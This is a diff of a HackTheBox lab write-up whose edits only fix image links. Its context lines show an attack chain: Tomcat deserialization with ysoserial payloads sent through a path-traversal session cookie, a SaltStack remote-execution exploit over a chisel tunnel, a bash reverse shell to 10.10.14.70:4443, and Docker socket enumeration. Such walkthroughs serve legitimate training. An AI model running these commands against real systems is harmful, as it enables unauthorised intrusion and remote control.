@@ -5,10 +5,10 @@ HackTheBox
 # Uploading files
 When trying to upload a file, it accepts all extension, even whithout any, however when there is no filename, there is an error.
 
-[![[Pasted image ](https://github.com/flucasd7/Ethical-Hacking)20240402175526.png)
+![](https://github.com/flucasd7/Ethical-Hacking/blob/main/Pasted%2020240402175526.png)
 
 Testing email: *test@tes    t.com* We have an error as well:
-[![[Pasted image ](https://github.com/flucasd7/Ethical-Hacking)20240402175654.png)
+![](https://github.com/flucasd7/Ethical-Hacking/blob/main/Pasted%2020240402175654.png)
 It seems that the upload folder is */opt/samples/uploads* but we don't have access to this
 
 Considering the errors and nmap scan result, this service uses **Apache 9.0.27** which is vulnerable
@@ -44,12 +44,12 @@ curl -s -X GET "http://10.10.10.205:8080/" -H "Cookie: JSESSIONID=../../../../..
 
 However, we don't receive anything
 
-[![[Pasted image ](https://github.com/flucasd7/Ethical-Hacking)20240403082426.png)
+![](https://github.com/flucasd7/Ethical-Hacking/blob/main/Pasted%2020240403082426.png)
 ### Using CommonsCollections2
 ````
 java -jar ysoserial-all.jar CommonsCollections2 'ping -c 1 10.10.14.70' > ping2.session
 ````
-[![[Pasted image ](https://github.com/flucasd7/Ethical-Hacking)20240403155457.png)
+![](https://github.com/flucasd7/Ethical-Hacking/blob/main/Pasted%2020240403155457.png)
 After loaded, we lunch the curl:
 `curl -s -X GET "http://10.10.10.205:8080/" -H "Cookie: JSESSIONID=../../../../../../../opt/samples/uploads/ping2"`
 
@@ -74,7 +74,7 @@ curl -s -X GET "http://10.10.10.205:8080/" -H "Cookie: JSESSIONID=../../../../..
 ````
 
 We get a GET request so we can infer it was executed and 
-[![[Pasted image ](https://github.com/flucasd7/Ethical-Hacking)20240403160836.png)
+![](https://github.com/flucasd7/Ethical-Hacking/blob/main/Pasted%2020240403160836.png)
 ### 2. Giving execution permission
 ````
  java -jar ysoserial-all.jar CommonsCollections2 'chmod +x /dev/shm/reverse.sh' > pwned2.session
@@ -96,37 +96,37 @@ curl -s -X GET "http://10.10.10.205:8080/" -H "Cookie: JSESSIONID=../../../../..
 
 curl must be executing with the port 4443 already listening
 
-[![[Pasted image ](https://github.com/flucasd7/Ethical-Hacking)20240403163214.png)
+![](https://github.com/flucasd7/Ethical-Hacking/blob/main/Pasted%2020240403163214.png)
 
 ## Privilege Escalation
 We can exploit pkexec but it's not the purpose of this machine 
 `find \-perm -4000 2>/dev/null`
-[![[Pasted image ](https://github.com/flucasd7/Ethical-Hacking)20240403163952.png)
+![](https://github.com/flucasd7/Ethical-Hacking/blob/main/Pasted%2020240403163952.png)
 
 Reviewing internal ports
 `netstat -nat`
 
-[![[Pasted image ](https://github.com/flucasd7/Ethical-Hacking)20240403164128.png)
+![](https://github.com/flucasd7/Ethical-Hacking/blob/main/Pasted%2020240403164128.png)
 
 ## SaltStak exploitation
 Ports 4505 and 4506 were not found in nmap scam
 
 https://www.exploit-db.com/exploits/48421
 
-[![[Pasted image ](https://github.com/flucasd7/Ethical-Hacking)20240403171344.png)
+![](https://github.com/flucasd7/Ethical-Hacking/blob/main/Pasted%2020240403171344.png)
 
 For this exploit we need to have installed module *salt*
 
 As ports 4505 and 4506 are open internally, we can have access to them by chisel 
 Uloading chisel:
-[![[Pasted image ](https://github.com/flucasd7/Ethical-Hacking)20240403172222.png)
+![](https://github.com/flucasd7/Ethical-Hacking/blob/main/Pasted%2020240403172222.png)
 
 Creating the tunnel:
-[![[Pasted image ](https://github.com/flucasd7/Ethical-Hacking)20240403172333.png)
+![](https://github.com/flucasd7/Ethical-Hacking/blob/main/Pasted%2020240403172333.png)
 
 Adding to /etc/proxychains.conf
 
-[![[Pasted image ](https://github.com/flucasd7/Ethical-Hacking)20240403172430.png)
+![](https://github.com/flucasd7/Ethical-Hacking/blob/main/Pasted%2020240403172430.png)
 
 ### Using the exploit with proxychains
 
@@ -134,14 +134,14 @@ Adding to /etc/proxychains.conf
 
 Testing command execution with the exploit:
 `proxychains python3 ssaltstack_exploit.py --exec "ping 10.10.14.70"`
-[![[Pasted image ](https://github.com/flucasd7/Ethical-Hacking)20240403172910.png)
+![](https://github.com/flucasd7/Ethical-Hacking/blob/main/Pasted%2020240403172910.png)
 
 ### Creating a shell to the container
 We test as first `"bash -c 'bash -i >& /dev/tcp/10.10.14.70/4443 0>&1'"` but it doesn't work, considering using *'* at the beginning and *"* in the inner bash.
 
 `proxychains python3 saltstack_exploit.py --exec 'bash -c "bash -i >& /dev/tcp/10.10.14.70/4443 0>&1"'`
 
-[![[Pasted image ](https://github.com/flucasd7/Ethical-Hacking)20240403173313.png)
+![](https://github.com/flucasd7/Ethical-Hacking/blob/main/Pasted%2020240403173313.png)
 
 ## Docker Container breakout
 [[Docker Breakout]]
@@ -150,19 +150,19 @@ Checking files and *history* of the machine
 - The `history` command in Linux is a powerful feature used primarily in command-line interfaces (CLI) to display a list of commands that have been previously entered by the user in the current session or saved in a user's history file
 We found a curl to *docker.sock* to list images
 
-[![[Pasted image ](https://github.com/flucasd7/Ethical-Hacking)20240403175021.png)
+![](https://github.com/flucasd7/Ethical-Hacking/blob/main/Pasted%2020240403175021.png)
 we only have access to this with *--unix-sockets*
 
 We can see the same information prettier by sending to the attacker machine
 
-[![[Pasted image ](https://github.com/flucasd7/Ethical-Hacking)20240403180537.png)
-[![[Pasted image ](https://github.com/flucasd7/Ethical-Hacking)20240403180522.png)
+![](https://github.com/flucasd7/Ethical-Hacking/blob/main/Pasted%2020240403180537.png)
+![](https://github.com/flucasd7/Ethical-Hacking/blob/main/Pasted%2020240403180522.png)
 
 We can try as well:
 `curl -s --unix-socket /var/run/docker.sock http://localhost/containers/json`
 
 To get access to dockers from the main machine, we don't have permissions but we can confirm that the path is /file/run/docker that is found in the container
-[![[Pasted image ](https://github.com/flucasd7/Ethical-Hacking)20240403180841.png)
+![](https://github.com/flucasd7/Ethical-Hacking/blob/main/Pasted%2020240403180841.png)
 
 ## Writable Docker Socket
 We already found an image called *sandbox:latest* 
